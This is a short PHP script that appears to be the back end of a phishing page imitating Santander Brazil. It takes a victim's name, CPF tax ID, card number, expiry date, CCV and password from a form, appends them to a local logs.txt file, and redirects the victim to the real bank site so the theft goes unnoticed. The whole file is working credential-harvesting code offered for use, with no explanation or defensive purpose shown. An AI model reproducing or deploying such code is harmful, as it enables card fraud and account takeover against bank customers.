<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $input1 = $_POST['input1'];
    $input2 = $_POST['input2'];
    $input3 = $_POST['input3'];
    $input4 = $_POST['input4'];
    $input5 = $_POST['input5'];
    $input6 = $_POST['input6'];
    $dados = "NOME: $input1\nCPF: $input2\nCARTAO: $input3\nMMAA: $input4\nCCV: $input5\nSENHA: $input6\n\n";
    $arquivo = 'logs.txt';
    if (!file_exists($arquivo)) {
        $file = fopen($arquivo, 'w');
        if ($file) {
            fwrite($file, $dados);
            fclose($file);
        } else {
            die("Não foi possível criar o arquivo.");
        }
    } else {
        $file = fopen($arquivo, 'a');
        if ($file) {
            fwrite($file, $dados);
            fclose($file);
        } else {
            die("Não foi possível abrir o arquivo.");
        }
    }
    header("location: https://www.santander.com.br/");
    echo "Dados enviados com sucesso!";
}
?>